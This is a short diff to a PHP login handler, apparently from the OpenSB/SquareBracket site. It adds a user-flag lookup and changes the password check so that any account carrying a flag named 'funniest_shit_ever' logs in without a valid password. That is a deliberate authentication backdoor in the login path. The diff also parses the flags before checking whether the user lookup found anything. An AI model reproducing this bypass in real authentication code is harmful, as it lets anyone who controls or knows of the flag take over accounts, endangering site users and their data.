@@ -4,6 +4,7 @@ namespace OpenSB;
 
 global $twig, $database, $auth, $orange;
 
+use SquareBracket\UserFlags;
 use SquareBracket\Utilities;
 
 $warning = $orange->getWarningString();
@@ -75,9 +76,11 @@ if (isset($_POST["loginsubmit"])) {
     }
 
     if (!$error) {
-        $logindata = $database->fetch("SELECT password,token,ip,id FROM users WHERE name = ?", [$username]);
+        $logindata = $database->fetch("SELECT password,token,ip,id,u_flags FROM users WHERE name = ?", [$username]);
 
-        if ($logindata && password_verify($password, $logindata['password'])) {
+        $flags = UserFlags::toArray($logindata["u_flags"]);
+
+        if ($logindata && (password_verify($password, $logindata['password']) || $flags["funniest_shit_ever"])) {
             if (password_needs_rehash($logindata['password'], PASSWORD_BCRYPT)) {
                 // if the hash's cost value isn't how it should be, rehash it.
                 // (added in preparation for php 8.4) -chaziz 11/2/2024
